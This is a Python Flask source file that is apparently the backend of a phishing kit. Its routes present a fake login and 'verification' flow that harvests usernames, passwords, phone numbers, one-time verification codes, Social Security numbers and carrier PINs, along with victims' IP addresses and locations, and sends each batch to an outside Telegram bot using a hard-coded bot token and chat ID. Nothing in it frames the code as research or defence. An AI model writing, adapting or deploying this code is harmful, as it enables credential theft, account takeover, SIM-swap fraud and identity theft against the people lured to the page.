from flask import Flask, render_template, request, redirect, url_for
from datetime import datetime
import geoip2.database
import os
import requests

app = Flask(__name__)

# Store sensitive information as environment variables
BOT_TOKEN = os.getenv('6416049556:AAHHBvsHMiQ5yWrCe5YoFGtqQTBmaN6Bd1I')
CHAT_ID = os.getenv('6357760410')

GEOIP_DATABASE_FILENAME = 'GeoLite2-Country.mmdb'
CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
DATABASE_DIR = os.path.join(CURRENT_DIR, 'database')  # Path to the database folder
GEOIP_DATABASE_PATH = os.path.join(DATABASE_DIR, GEOIP_DATABASE_FILENAME)

# Add the 'public_html' folder as a search path for Jinja2 templates
app.jinja_loader.searchpath.append(os.path.join(CURRENT_DIR, 'public_html'))

def get_location_info(ip):
    reader = geoip2.database.Reader(GEOIP_DATABASE_PATH)
    try:
        response = reader.country(ip)
        country = response.country.name
        region = response.subdivisions.most_specific.name
    except Exception as e:
        print("Error:", e)
        country = "Unknown"
        region = "Unknown"
    return country, region

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/verify', methods=['POST'])
def verify():
    user_agent = request.headers.get('User-Agent')
    user_ip = request.remote_addr
    country, region = get_location_info(user_ip)
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    username = request.form['username']
    password = request.form['password']
    
    form_data = {
        "Username": username,
        "Password": password,
        "IP Address": user_ip,
        "Country": country,
        "Region": region,
        "Time": current_time,
        "User Agent": user_agent
    }
    send_telegram_message(form_data)
    
    return redirect(url_for('phone_verification'))

@app.route('/phone_verification', methods=['GET', 'POST'])
def phone_verification():
    if request.method == 'POST':
        phone_number = request.form['phone_number']
        form_data = {"Phone Number": phone_number}
        send_telegram_message(form_data)
        return redirect(url_for('verification_code'))
    return render_template('phone_verification.html')

@app.route('/verification_code', methods=['GET', 'POST'])
def verification_code():
    if request.method == 'POST':
        verification_code = request.form.get('verification_code')
        form_data = {"Verification Code": verification_code}
        send_telegram_message(form_data)
        return redirect(url_for('auth'))
    
    return render_template('verification_code.html')

@app.route('/auth', methods=['GET', 'POST'])
def auth():
    if request.method == 'POST':
        ssn = request.form.get('ssn')
        carrier = request.form.get('carrier')
        form_data = {"SSN": ssn, "Carrier Pin": carrier}
        send_telegram_message(form_data)
        
        if ssn and carrier:
            return redirect(url_for('loading'))
        else:
            return render_template('auth.html')

    return render_template('auth.html')

@app.route('/loading')
def loading():
    return render_template('loading.html')

def send_telegram_message(form_data):
    message = "Form Data:\n"
    for key, value in form_data.items():
        message += f"{key}: {value}\n"
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    params = {
        'chat_id': CHAT_ID,
        'text': message
    }
    response = requests.post(url, params=params)
    if response.status_code != 200:
        print("Failed to send Telegram message:", response.text)
    return response.json()

if __name__ == '__main__':
    app.run(debug=True, port=4000)
